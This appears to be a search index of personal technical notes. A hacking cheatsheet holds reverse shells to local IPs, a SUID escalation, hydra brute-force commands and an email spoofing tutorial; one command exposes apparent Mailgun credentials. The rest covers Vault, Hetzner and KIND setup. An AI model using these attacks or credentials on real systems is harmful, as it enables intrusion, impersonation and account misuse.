xterm\nstty rows 62 columns 248\nexport TERM=xterm\nexport SHELL=bash  \n</code></pre> <p>Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra m\u00e1quina. Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla as\u00ed como Ctrl+C.****./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'</p>"},{"location":"Hacking/cheatsheet/#bash","title":"bash","text":"<pre><code>chmod u+s /bin/bash\n</code></pre>"},{"location":"Hacking/cheatsheet/#images","title":"images","text":"<pre><code>steghide --extract -sf penguin.jpg -p chocolate\ndocker run -v $(pwd):/data -it paradoxis/stegcracker penguin.jpg\n</code></pre>"},{"location":"Hacking/cheatsheet/#keepass","title":"keepass","text":"<pre><code>keepass2john penguin.kdbx &gt; keep.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt ./keep.txt\nkpcli --kdb=./penguin.kdbx\n</code></pre>"},{"location":"Hacking/cheatsheet/#smb","title":"SMB","text":"<pre><code>smbmap -H 172.17.0.2 # listar directorios compartidos\nrpcclient -U '' -N 172.17.0.2 # listar usuarios\nquerydispinfo and unumdomusers\n\nMETASPLOT\nuse scanner/smb/smb_login\n\nhydra -l bob -P /usr/share/wordlists/rockyou.txt smb://172.17.0.2 -t 64\n</code></pre>"},{"location":"Hacking/cheatsheet/#search-permissions","title":"search permissions","text":"<pre><code>find / -perm -4000 2&gt;/dev/null\n</code></pre>"},{"location":"Hacking/cheatsheet/#reverse-shells","title":"Reverse shells","text":""},{"location":"Hacking/cheatsheet/#javascript","title":"javascript","text":"<pre><code>var host=\"172.17.0.1\";\nvar port=444;\nvar cmd=\"cmd.exe\";\nvar p=new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (e){}};p.destroy();s.close();\n</code></pre>"},{"location":"Hacking/cheatsheet/#javascript_1","title":"javascript","text":"<pre><code>String host=\"192.168.1.40\";\nint port=443;\nString cmd=\"bash\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n</code></pre>"},{"location":"Hacking/cheatsheet/#hydra","title":"Hydra","text":""},{"location":"Hacking/cheatsheet/#jenkins","title":"Jenkins","text":"<pre><code>hydra -l root -p password 10.129.8.179 http-post-form \"/j_spring_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=&amp;Submit=Sign+in:C=/login:Invalid\" -s 8080 -v\n</code></pre>"},{"location":"Hacking/cheatsheet/#ssh","title":"ssh","text":"<pre><code>hydra -l manchi -P /usr/share/wordlists/rockyou.txt -v 172.17.0.3 -t 4 -u ssh\n</code></pre>"},{"location":"Hacking/emailSpoof/","title":"Spoof E-Mail Using SendEmail and Postfix","text":"<p>BY N0SFERATU 11/09/2020 4:41 PM</p> <p>Hello, fellow hackers! Today I am going to show you just how easy it is to spoof E-Mails and impersonate any E-Mail address. Because of how easy it is to do, anyone with five minutes of free time can send malicious E-Mails to you while pretending to be your boss, teacher, SO, etc. You can probably guess how devastating the consequences of such an attack can be.</p>"},{"location":"Hacking/emailSpoof/#explaining-the-attack-the-smtp-protocol","title":"Explaining the Attack: The SMTP Protocol","text":"<p>SMTP stands for **S**imple **M**ail **T**ransfer **P**rotocol and has existed for much longer than the Internet.</p> <p>When you want to send an E-Mail, you need to first craft the E-Mail message using a user agent. Common user agents include the GMail app or the Protonmail application on your phone. Once you click \"Send\", your user agent forwards the E-Mail (usually over SMTP or HTTP) to your mail server (typically your ISP's mail server) where it is placed in an outgoing message queue. When the time comes, the mail server looks at the recipient's E-Mail, specified in the E-Mail message, and sends the message over SMTP to that recipient's mail server. The recipient can later view his E-Mails on-demand over POP3 or IMAP using his user agent.</p> <p></p> <p>In order to explain the way our attack will work, let's look at a simple message exchange between two mail servers. We will call the sender's mail server, the client (C), and the recipient's mail server - the server (S). This might be a bit confusing at first glance, but if you think about it, the sender's mail server initiates a connection with the recipient's mail server, which in this context makes the former one a client and the latter one a server.</p> <p></p> <p>S: 220 kali.localdomain ESMTP Postfix (Debian/GNU) C: HELO localhost S: 250 kali.localdomain</p> <p>Just as us humans, SMTP servers first greet each other with what's called a handshake. After connecting to the server, the server responds with a 220  Service ready message which means that it's ready to proceed with the handshake. Next, our client uses the HELO command to initiate the handshake, to which the server responds with 250, denoting that the previous command was run successfully. The handshake is complete and the client can now start sending E-Mail messages to the server. Let's see how this is done: <p>C: MAIL FROM: notarealemail@gmail.com S: 250 2.1.0 Ok C: RCPT TO: anotherfakeemail@gmail.com S: 250 2.1.5 Ok C: DATA S: 354 End data with . C: This is just a test message. Hello! . S: 250 2.0.0 Ok: queued as A0C83260DDC C: QUIT S: 221 2.0.0 Bye <p>Above we can see how a simple E-Mail message is sent from one mail server to another. After a successful handshake, the client sends a MAIL FROM:  command, telling the server who the sender of the E-Mail is. To that the server replies with a 250 Requested mail action okay, completed, meaning that the last command was executed successfully and the server is ready to proceed. Next, the client issues a RCPT TO:  command to tell the server who to deliver the E-Mail message to. The server again replies with a 250 Success message. Finally, the client sends a DATA command, telling the server that it will soon send the contents of the E-Mail message. The server responds with 354 Start mail input and some additional information as to how the client should format the message. Next, the client writes the E-Mail message and once he is done, he puts a dot on a new line and then another new line(), which tells the server that the message is complete and ready to be queued. The server accept the message (again giving us a 250 Success code) and puts it in its message queue. If the client wants to send more E-Mail messages, he can do so by repeating the above steps for each message. If not he can just issue the QUIT command to terminate the connection. <p>Note that above we described the process of sending an E-Mail message between a user agent and a mail server, not the process of sending an E-Mail message between two mail servers. That process is exactly the same with the only difference, being that when the receiving mail server gets the message, it won't put it in an outgoing queue, but will instead save the message in the recipient's inbox.</p> <p>This is all well and good, but how does it helps us? Here comes the fun part! SMTP does no checking of the information for the sender's E-Mail address. It completely trusts that what it's presented with is the correct address. We can use that to our advantage by specifying an arbitrary E-Mail address as the sender. The recipient will see the message as sent by the E-Mail address, contained in the message, even though it was actually us simply impersonating it.</p> <p>Now that we understand the attack, let's see how we can execute it.</p>"},{"location":"Hacking/emailSpoof/#step-1installing-postfix-and-sendemail","title":"Step 1Installing Postfix and SendEmail","text":"<p>We need to get the proper tools on our machine before we can do anything. In order to successfully complete an attack, we need to first host our own mail server or use a server which will provide one for us, such as smtp2go. For simplicity here, we will host our own server with Postfix. You can install it by running the following command as root:</p> <p>$ apt install postfix</p> <p>You can ignore any warnings about copying configuration files around. Next, we need to get sendemail, which is what we will use to send the actual fake E-Mail messages. Install it by running the following command as root:</p> <p>$ apt install sendemail</p>"},{"location":"Hacking/emailSpoof/#step-2starting-the-mail-server","title":"Step 2Starting the Mail Server","text":"<p>After getting the proper tools, it's time for us to start our local mail server. Execute as root:</p> <p>$ systemctl start postfix</p> <p>This will start Postfix E-Mail server and have it listen on port 25 for connections. You can skip this step, if you are using an existing mail server.</p>"},{"location":"Hacking/emailSpoof/#step-3sending-the-email","title":"Step 3Sending the Email","text":"<p>To craft the custom E-Mail, we will be using SendEmail - a lightweight, command line SMTP client, written by Brandon Zehm. We can do so with the following command:</p> <p>$ sendemail -f a1ucard0@gmail.com -t dummymail31337@gmail.com -u \"A Real Email\" -m \"This is a very real email\"</p> <p></p> <p>As you can see, the E-Mail was sent successfully and if I check my inbox...</p> <p></p> <p>You might have noticed that the E-Mail got delivered to my spam folder. This is because I am using my own mail server and so the message never gets encrypted or validated by Google or my ISP's mail server. This wouldn't be the case if I actually used an external mail server, such as the ones provided by smtp2go.</p> <p>Let's dissect the above command to learn what each of the arguments mean: -f - used to specify the sender's email address. Here you have to input the address you want to appear as. -t - used to specify the recipient's email address. -u - specifies the subject of the E-Mail. Note that this option is not required. -m - specifies the actual contents of the E-Mail.</p> <p>Some additional arguments you can use are: -a - followed by a filepath for attaching files.</p> <p>-o message-file=FILENAME - you can specify a file that contains the contents of the E-Mail, instead of manually typing them on the command line.</p> <p>-o message-header=\"Name:Value\" - here you can specify additional E-Mail headers such as the \"From:\" header which will change the name (but not the E-Mail address, that is done with -f) of the sender.</p> <p>-s SERVER:PORT - you can use this to specify the IP Address and port of the server you will be using. Defaults to localhost:25.</p>"},{"location":"Hacking/emailSpoof/#step-4cleaning-up","title":"Step 4Cleaning Up","text":"<p>Don't forget to shut down the Postfix mail server: $ systemctl stop postfix</p>"},{"location":"Hacking/emailSpoof/#conclusion","title":"Conclusion","text":"<p>Now you know just how easy it is to spoof E-Mail. You also surely realize what the consequences of such an attack might be!</p> <p>I have shown you this purely for educational purposes and I am not responsible for anything you do with that knowledge! Keep learning and see you soon!</p> <p>If for any reason, you need to replace the email sender with another name/email address, you must follow the recommendations below.</p>"},{"location":"Hacking/emailSpoof/#step-by-step-guide","title":"Step-by-step guide","text":"<ol> <li>Add the following line in <code>/etc/postfix/main.cf</code> . All outgoing emails will have this address in the FROM field, but the name of the sender will not be modified. Replace  with your fully qualified domain name. <p><code>sender_canonical_maps = ``static``:no-reply@&lt;FQDN&gt;</code></p> <ol> <li>To modify the name as well, you need to create a file in <code>/etc/postfix/header_checks</code> which contains this line:</li> </ol> <p><code>/^From:[[:space:]]+(.*)/ REPLACE From: ``\"Your Name\"</code> <code>&lt;email``@company``.com&gt;</code></p> <ol> <li>Then run the following commands:</li> </ol> <p><code>cd /etc/postfix``postmap header_checks``postconf -e ``'smtp_header_checks = regexp:/etc/postfix/header_checks'``service postfix reload</code></p> <pre><code>dpkg-reconfigure postfix\n</code></pre> <pre><code>sendemail -f mailgun@bluetrailsoft.com -t rafaelm@bluetrailsoft.com -u subject -m \"message\" -s smtp.mailgun.org:587 -o tls=yes -xu  postmaster@sandboxa4e02b6babb14666b955cacd19810f18.mailgun.org -xp 2f508af636839296093add8721c31a43-b02bcf9f-47600956\n</code></pre>"},{"location":"Hacking/subfinder/","title":"Subfinder","text":"<p>let\u2019s say we have domain called example.com</p> <p>first we have to do subdomain enumeration , I usually use subfinder with editing the API configuration file you can check it on https://securitytrails.com/blog/subfinder</p> <pre><code>subfinder -d example.com -all -cs &gt; main.txt ; cat main.txt | cut -d \",\" -f 1 &gt; domains.txt ; rm -rf main.txt\n</code></pre> <p>now we have created a file named domains.txt and then we need to check the live subdomains and checking the status code of them</p> <p>simply we can use httpx tool by typing command</p> <pre><code>cat domains.txt | httpx -title -wc -sc -cl -ct -location -web-server -asn -o alive-subdomains.txt \n</code></pre> <p>I found interested subdomain with error code 404 that points to \u201cGOOGLE-CLOUD-PLATFORM\u201d</p> <p>let\u2019s name it altice.example.com</p> <p>after visited that url I found a defualt NOT Found page for \u201cLeadpages services\u201d</p> <p></p> <p>Here we start to retrieving information about DNS name servers by dig command</p> <p>we can type on terminal</p> <pre><code>dig altice.example.com\n</code></pre> <p>or visiting https://www.digwebinterface.com/</p> <p></p> <p>in this result we found the CNAME server is custom-proxy.leadpages.net</p> <p>I tried to visit https://github.com/EdOverflow/can-i-take-over-xyz to check if that service is vulnerable or not but unfortunately, I haven\u2019t found it there</p> <p>But also that doesn\u2019t mean \u201cLeadpages services\u201d isn\u2019t vulnerable</p> <p>After creating a free trial for 14 days account and you have to put your valid paypal email or valid credit card on https://www.leadpages.com/</p> <p></p> <p>Start modifying the template and change it to my name as a POC</p> <p>Here\u2019s the most exciting part</p> <p></p> <p>Click on upadte &gt; site publishing options</p> <p>put your vulnerable subdomain in our case : altice.example.com</p> <p></p> <p>click on done</p> <p>now the ssl will be connected to our custom domain</p> <p></p> <p>let\u2019s visit the vulnerable site right now</p> <p></p> <p>And I Finally Found My name</p> <p></p> <p>while I was writing that writeup I got some ideas of google dorks that may help U</p> <pre><code>site:\"*.example.com\" intext:\"PAGE NOT FOUND\" | intext:\"project not found\" | intext:\"Repository not found\"  | intext:\"domain does not exist\" | intext:\"This page could not be found\" | intext:\"404 Blog is not found\" | intext:\"No settings were found for this company\" | intext:\"domain name is invalid\"\n</code></pre> <p>In case you have any questions you can ask me in the comments section and I will asnwer it happily</p> <p>and don\u2019t forget to follow me in twitter to get useful informations &amp; tips</p> <p>Thank U \u2764</p>"},{"location":"Hacking/tools/","title":"Tools","text":""},{"location":"Hacking/tools/#hacking-tools","title":"Hacking tools","text":"<p>Subdomain discovery</p> <pre><code>https://github.com/projectdiscovery/subfinder\n</code></pre> <p>Contetnt listing</p> <pre><code>https://github.com/lc/gau\n</code></pre> <p>Port scaning in golang</p> <pre><code>https://github.com/projectdiscovery/naabu\n</code></pre> <p>Katana crawling data</p> <pre><code>https://github.com/projectdiscovery/katana\n</code></pre> <p>metasploit</p> <pre><code>sudo docker run --rm -it --name=metasploit metasploitframework/metasploit-framework:latest\n</code></pre>"},{"location":"Hacking/webs/","title":"Webs","text":"<p>https://iplogger.org/</p> <p>https://ipinfo.io/</p> <p>https://www.shorturl.at/</p> <p>https://imgbb.com/</p> <p>https://book.hacktricks.xyz/welcome/readme</p> <p>https://pentestmonkey.net/</p>"},{"location":"Hacking/webs/#email-finder","title":"email finder","text":"<p>https://phonebook.cz/</p>"},{"location":"Hacking/webs/#test-spoofmail","title":"test spoofmail","text":"<p>https://emkei.cz/</p> <p>https://mxtoolbox.com/supertool.aspx</p> <p>https://smartfense.com/recursos/herramientas/spoof-check/</p> <p>https://gchq.github.io/CyberChef/</p>"},{"location":"Hacking/webs/#it-tools-like-cyberchef","title":"It tools like cyberchef","text":"<p>https://it-tools.tech/</p> <p>https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/</p> <p>https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</p>"},{"location":"Hacking/webs/#email-extractor","title":"email extractor","text":"<p>https://recruitin.net/</p> <p>https://email-checker.net/email-extractor</p>"},{"location":"Hacking/zap-proxy/","title":"ZAP - Webswing Usage","text":"<p>DOCKER &gt; ZAP - WEBSWING USAGE</p>"},{"location":"Hacking/zap-proxy/#zap-webswing-usage_1","title":"ZAP - Webswing Usage","text":"<p>Starting with version 2.5.0 you can run the ZAP Desktop UI in your browser without having to install Java, thanks to the magic of Docker and Webswing</p> <p>To do this you will just need Docker installed. Start the container with webswing support:</p> <ul> <li>Stable:</li> <li><code>docker run -u zap -p 8080:8080 -p 8090:8090 -i ghcr.io/zaproxy/zaproxy:stable zap-webswing.sh</code></li> <li>Weekly:</li> <li><code>docker run -u zap -p 8080:8080 -p 8090:8090 -i ghcr.io/zaproxy/zaproxy:weekly zap-webswing.sh</code></li> </ul> <p>Then point your browser at:</p> <ul> <li>http://localhost:8080/zap</li> </ul> <p>You will then see the familiar ZAP splash screen while ZAP starts up.</p> <p></p> <p>The ZAP UI acts in just the same way as it does when running \u2019natively'.</p> <p>The performance is surprisingly good, although a little bit slower. You can still move and resize the windows and some (but not all) of the keyboard shortcuts will work.</p>"},{"location":"Hacking/zap-proxy/#proxying-through-zap","title":"Proxying through ZAP","text":"<p>You can even proxy your browser through ZAP, via the URL http://localhost:8090</p> <p>However it is not possible to launch browsers via ZAP started via Webswing so in order to proxy https based sites you need to start the docker container with a local drive mapped to <code>/zap/wrk</code> e.g. using:</p> <ul> <li><code>docker run -v $(pwd):/zap/wrk/:rw -u zap -p 8080:8080 -p 8090:8090 -i ghcr.io/zaproxy/zaproxy:stable zap-webswing.sh</code></li> </ul> <p>When you do this ZAP will create 2 files on your mapped drive:</p> <ul> <li>zap_root_ca.crt - the public ZAP Root CA certificate</li> <li>zap_root_ca.key - the private ZAP Root CA certificate</li> </ul> <p>Note that <code>$(pwd)</code> is supported on Linux, MacOS and PowerShell. See Docker About - Mounting the current directory for Windows, etc.</p> <p>You will then need to configure one of your browsers to proxy via ZAP and import the public ZAP Root CA certificate so that it is trusted to sign websites.</p> <p>It is recommended that you keep a separate browser profile for proxying through ZAP.</p> <p>If you restart the docker container using the same mapped drive then ZAP will automatically import the private ZAP Root CA certificate so you will not need to import it into your browser again.</p> <p>Note that you will need to visit http://localhost:8080/zap before you can use ZAP as a proxy - ZAP will only start to run when you visit that URL.</p>"},{"location":"Hacking/zap-proxy/#zap-command-line-options","title":"ZAP Command Line Options","text":"<p>When you run ZAP using Webswing then the following ZAP Command Line Options will be used:</p> <ul> <li>If there is a <code>ZAP_WEBSWING_OPTS</code> environmental variable set then its value will be used</li> <li>If not then if a <code>/zap/wrk/zap_root_ca.key</code> file exists then this is loaded as the ZAP root cert</li> <li>If not then if the <code>/zap/wrk</code> is writable then ZAP will output the public and private ZAP cert into that directory</li> <li>If not then the default ZAP options will be used: <code>-host 0.0.0.0 -port 8090</code></li> </ul> <p>For example to start ZAP listening on a different port (9090) use:</p> <ul> <li><code>docker run -v $(pwd):/zap/wrk/:rw -e ZAP_WEBSWING_OPTS=\"-host 0.0.0.0 -port 9090\" -u zap -p 8080:8080 -p 9090:9090 -i ghcr.io/zaproxy/zaproxy:stable zap-webswing.sh</code></li> </ul>"},{"location":"HashicorpVault/","title":"Vault Agent (Persistent) Docker Compose Setup","text":"<p>May 01, 2022</p> <p>\u200b       </p> <p>TL;DR: You can find the code in this Github repo.</p> <p>Recently I needed to integrate Hashicorp Vault with a Java application. For local development I wanted to use Vault Agent which can connect to the Vault server. The advantage of using Vault  Agent is that it bears the brunt of authentication complexity with Vault server (including SSL certificates). Effectively, this means that a  client application can send HTTP requests to Vault Agent without any  need to authenticate. This setup is frequently used in the real world  for example by using Agent Sidecar Injector inside a Kubernetes cluster. It makes it easy for client applications  inside a K8s pod to get/put information to a Vault server without each  one having to perform the tedious authentication process.</p> <p>Surprisingly, I couldn\u2019t find much information on using Vault with  Vault Agent via docker-compose, which in my opinion is by far the  easiest method to set up a Vault playground. I did find this example which served as the inspiration for this post however it  involves a more complex setup as well as using Postgres and Nginx. I\u2019d  like to present the most minimal setup, the bare basics needed to spin  up a Vault Agent and access it locally via <code>localhost</code>.</p> <p>WARNING: the setup is intentionally simplified, please don\u2019t use it in production.</p> <p>First of all we\u2019ll use the official Vault docker images for the <code>docker-compose.yml</code>:</p> <pre><code>version: '3.7'\n\nservices:\n  vault-agent:\n    image: hashicorp/vault:1.9.6\n    restart: always\n    ports:\n      - \"8200:8200\"\n    volumes:\n      - ./helpers:/helpers\n    environment:\n      VAULT_ADDR: \"http://vault:8200\"\n    container_name: vault-agent\n    entrypoint: \"vault agent -log-level debug -config=/helpers/vault-agent.hcl\"\n    depends_on:\n      vault:\n        condition: service_healthy\n  vault:\n    image: hashicorp/vault:1.9.6\n    restart: always\n    volumes:\n      - ./helpers:/helpers\n      - vault_data:/vault/file\n    ports:\n      - \"8201:8200/tcp\"\n    cap_add:\n      - IPC_LOCK\n    container_name: vault\n    entrypoint: \"vault server -config=/helpers/vault-config.hcl\"\n    healthcheck:\n      test: wget --no-verbose --tries=1 --spider http://localhost:8200 || exit 1\n      interval: 10s\n      retries: 12\n      start_period: 10s\n      timeout: 10s\n\nvolumes:\n  vault_data: {}\n</code></pre> <p>Here we\u2019re using the same image to start Vault server in dev mode as  well as start the Vault Agent. In addition a volume is created for <code>helpers</code> directory which will contain:</p> <ol> <li>The policy for Vault server <code>admin-policy.hcl</code>:</li> </ol> <p><code>hcl    path \"sys/health\"    {    capabilities = [\"read\", \"sudo\"]    }    path \"sys/policies/acl\"    {    capabilities = [\"list\"]    }    path \"sys/policies/acl/*\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"auth/*\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"sys/auth/*\"    {    capabilities = [\"create\", \"update\", \"delete\", \"sudo\"]    }    path \"sys/auth\"    {    capabilities = [\"read\"]    }    path \"kv/*\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"secret/*\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"identity/entity-alias\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"identity/entity-alias/*\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"identity/entity\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"identity/entity/*\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"sys/mounts/*\"    {    capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"]    }    path \"sys/mounts\"    {    capabilities = [\"read\"]    }</code></p> <ol> <li>The policy for Vault Agent <code>vault-agent.hcl</code>:</li> </ol> <p><code>hcl    pid_file = \"./pidfile\"    vault {    address = \"http://vault:8200\"    retry {    num_retries = 5    }    }    auto_auth {    method {    type = \"approle\"    config = {      role_id_file_path = \"/helpers/role_id\"      secret_id_file_path = \"/helpers/secret_id\"      remove_secret_id_file_after_reading = false    }    }    sink \"file\" {    config = {      path = \"/helpers/sink_file\"    }    }    }    cache {    use_auto_auth_token = true    }    listener \"tcp\" {    address = \"0.0.0.0:8200\"    tls_disable = true    }</code></p> <ol> <li>The <code>init.sh</code> script which will create AppRole auth method:</li> </ol> <p>```bash    apk add jq curl    export VAULT_ADDR=http://localhost:8200    root_token=$(cat /helpers/keys.json | jq -r '.root_token')    unseal_vault() {    export VAULT_TOKEN=$root_token    vault operator unseal -address=${VAULT_ADDR} $(cat /helpers/keys.json | jq -r '.keys[0]')    vault login token=$VAULT_TOKEN    }    if [[ -n \"$root_token\" ]]    then      echo \"Vault already initialized\"      unseal_vault    else      echo \"Vault not initialized\"      curl --request POST --data '{\"secret_shares\": 1, \"secret_threshold\": 1}' http://127.0.0.1:8200/v1/sys/init &gt; /helpers/keys.json      root_token=$(cat /helpers/keys.json | jq -r '.root_token')</p> <pre><code> unseal_vault\n\n vault secrets enable -version=2 kv\n vault auth enable approle\n vault policy write admin-policy /helpers/admin-policy.hcl\n vault write auth/approle/role/dev-role token_policies=\"admin-policy\"\n vault read -format=json auth/approle/role/dev-role/role-id \\\n   | jq -r '.data.role_id' &gt; /helpers/role_id\n vault write -format=json -f auth/approle/role/dev-role/secret-id \\\n   | jq -r '.data.secret_id' &gt; /helpers/secret_id\n</code></pre> <p>fi    printf \"\\n\\nVAULT_TOKEN=%s\\n\\n\" $VAULT_TOKEN    ```</p> <ol> <li>Below is the config for the Vault server to be saved in <code>vault-config.hcl</code> file:</li> </ol> <pre><code>storage \"file\" {\n  # this path is used so that volume can be enabled https://hub.docker.com/_/vault\n  path = \"/vault/file\"\n}\n\nlistener \"tcp\" {\n  address     = \"0.0.0.0:8200\"\n  tls_disable = \"true\"\n}\n\napi_addr = \"http://127.0.0.1:8200\"\ncluster_addr = \"https://127.0.0.1:8201\"\nui = true\n</code></pre> <p>Next we\u2019ll create <code>startVault.sh</code> script to start Vault:</p> <pre><code>WAIT_FOR_TIMEOUT=120 # 2 minutes\ndocker-compose up --detach\necho Waiting for Vault Agent container to be up\ncurl https://raw.githubusercontent.com/eficode/wait-for/v2.2.3/wait-for | sh -s -- localhost:8200 -t $WAIT_FOR_TIMEOUT -- echo success\ndocker exec vault /bin/sh -c \"source /helpers/init.sh\"\ndocker restart vault-agent\n</code></pre> <p>After you created the above files in the <code>helpers</code> directory, the project structure should be as follows:</p> <pre><code>.\n\u251c\u2500\u2500 docker-compose.yml\n\u251c\u2500\u2500 helpers\n\u2502   \u251c\u2500\u2500 admin-policy.hcl\n\u2502   \u251c\u2500\u2500 init.sh\n\u2502   \u251c\u2500\u2500 vault-agent.hcl\n\u2502   \u2514\u2500\u2500 vault-config.hcl\n\u2514\u2500\u2500 startVault.sh\n</code></pre> <p>Finally, run <code>source startVault.sh</code> to start Vault server and Vault Agent.</p> <p>Now any client application can access Vault Agent over <code>http://localhost:8200</code> on the host machine, for example the following command creates a secret name <code>hello</code>:</p> <pre><code>curl --request POST -H \"Content-Type: application/json\"  \\\n--data '{\"data\":{\"foo\":\"bar\"}}' http://localhost:8200/v1/kv/data/hello\n</code></pre> <p>while this command retrieves the secret name <code>hello</code>:</p> <pre><code>curl http://localhost:8200/v1/kv/data/hello\n</code></pre> <p>In addition Vault web UI is available at <code>http://localhost:8201/ui</code>. In order to log into the UI use the value of <code>root_token</code> field in <code>./helpers/key.json</code> file (using token login method in the UI).</p> <p>Vault server uses file storage backend which makes this a persistent  setup (a docker volume is mounted), so that tokens data will persist  after machine restart or running <code>docker-compose down</code>.</p>"},{"location":"Hetzner/RestoreRootPassw/","title":"RestoreRootPassw","text":"<pre><code>In case our automatic password reset does not work, you need to reset the password manually trough rescue:\n\n1. Goto the Rescue Section of your server, but click on the Activate Rescue &amp; Power Cycle button instead of the (reset root password) button.\n2. After that your server will boot into a rescue system.\n3. Connect to your server via SSH with the rescue login details\n4. Run the following commands in Rescue:\n---8&lt;---\nmount /dev/sda1 /mnt\n\nchroot-prepare /mnt\n\nchroot /mnt\n\npasswd\n---8&lt;---\n\n5. Reboot your server and login with the new password (Also check whether the Quemu Guest Agent is installed).\n\nIf you have any further questions, feel free to contact u\n</code></pre>"},{"location":"Kind%28k8s%29/cheatsheet/","title":"Kubernetes KIND Cheat Sheet","text":"<p>Oleg Sucharevich</p> <p>\u00b7</p> <p>Follow</p> <p>Published in</p> <p>ITNEXT</p> <p>\u00b7</p> <p>2 min read</p> <p>\u00b7</p> <p>Oct 29, 2021</p> <p>44</p> <p></p> <p>kind is a tool for running local Kubernetes clusters using Docker container \u201cnodes\u201d. kind was primarily designed for testing Kubernetes itself, but may be used for local development or CI.</p>"},{"location":"Kind%28k8s%29/cheatsheet/#autocompletion","title":"Autocompletion","text":""},{"location":"Kind%28k8s%29/cheatsheet/#bash","title":"Bash","text":"<pre><code># Setup the current shell\nsource &lt;(kind completion bash)########\n## OR ##\n######### Update permanently\necho \u201csource &lt;(kind completion bash) &gt;&gt; ~/.bashrc\u201d\n</code></pre>"},{"location":"Kind%28k8s%29/cheatsheet/#zsh","title":"ZSH","text":"<pre><code>source &lt;(kind completion zsh)\n</code></pre>"},{"location":"Kind%28k8s%29/cheatsheet/#basic","title":"Basic","text":"<p>Create kind cluster named cncf-cheat-sheet</p> <pre><code>kind create cluster \u2014 name cncf-cheat-sheet\n</code></pre> <p>Create cluster and wait for all the components to be ready</p> <pre><code>kind create cluster \u2014 wait 2m\n</code></pre> <p>Get running clusters</p> <pre><code>kind get clusters\n</code></pre> <p>Delete kind cluster named cncf-cheat-sheet</p> <pre><code>kind delete cluster \u2014 name cncf-cheat-sheet\n</code></pre>"},{"location":"Kind%28k8s%29/cheatsheet/#advanced-configuration","title":"Advanced Configuration","text":"<p>Use kind.yaml config file for more advanced use cases</p>"},{"location":"Kind%28k8s%29/cheatsheet/#ports","title":"Ports","text":"<p>Info Map port 80 from the cluster control plane to the host.</p> <pre><code>cat &lt;&lt;EOF | kind create cluster \u2014 name cncf-cheat-sheet \u2014 config -\nkind: Cluster\napiVersion: kind.x-k8s.io/v1alpha4\nnodes:\n- role: control-plane\n extraPortMappings:\n \u2014 containerPort: 80\n hostPort: 80\n protocol: TCP\nEOF\n</code></pre>"},{"location":"Kind%28k8s%29/cheatsheet/#mount-directories","title":"Mount Directories","text":"<p>Info Mount current directory into clusters control plane located at <code>/app</code></p> <p>NOTE: MacOS users: make sure to share resources in docker-for-mac preferences</p> <pre><code>cat &lt;&lt;EOF | kind create cluster \u2014 name cncf-cheat-sheet \u2014 config -\nkind: Cluster\napiVersion: kind.x-k8s.io/v1alpha4\nnodes:\n- role: control-plane\n extraMounts:\n \u2014 hostPath: .\n containerPath: /app\nEOF\n</code></pre>"},{"location":"Kind%28k8s%29/cheatsheet/#add-local-registry","title":"Add Local Registry","text":"<p>Info</p> <p>Step 1: Create local registry</p> <pre><code>docker run -d \u2014 restart=always -p 127.0.0.1:5000:5000 \u2014 name cncf-cheat-sheet-registry registry:2\n</code></pre> <p>Step 2: Create cluster</p> <pre><code>cat &lt;&lt;EOF | kind create cluster \u2014 name cncf-cheat-sheet \u2014 config -\nkind: Cluster\napiVersion: kind.x-k8s.io/v1alpha4\ncontainerdConfigPatches:\n- |-\n [plugins.\u201dio.containerd.grpc.v1.cri\u201d.registry.mirrors.\u201dlocalhost:5000\"]\n endpoint = [\u201chttp://cncf-cheat-sheet-registry:5000\"]\nnodes:\n- role: control-plane\nEOF\n</code></pre> <p>Step 3: Connect registry with created network</p> <pre><code>docker network connect kind cncf-cheat-sheet-registry\n</code></pre> <p>Step 4: Update cluster about new registry</p> <pre><code>cat &lt;&lt;EOF | kubectl apply -f -\napiVersion: v1\nkind: ConfigMap\nmetadata:\n name: local-registry-hosting\n namespace: kube-public\ndata:\n localRegistryHosting.v1: |\n host: \u201clocalhost:5000\u201d\nEOF\n</code></pre>"},{"location":"Kind%28k8s%29/cheatsheet/#multiple-workers","title":"Multiple Workers","text":"<p>Info The default configuration will create cluster with one node (control-plane).</p> <pre><code>cat &lt;&lt;EOF | kind create cluster \u2014 name cncf-cheat-sheet \u2014 config -\nkind: Cluster\napiVersion: kind.x-k8s.io/v1alpha4\nnodes:\n- role: control-plane\n- role: worker\nEOF\n</code></pre>"},{"location":"Kubernetes/Dockerfile-kube/","title":"Dockerfile 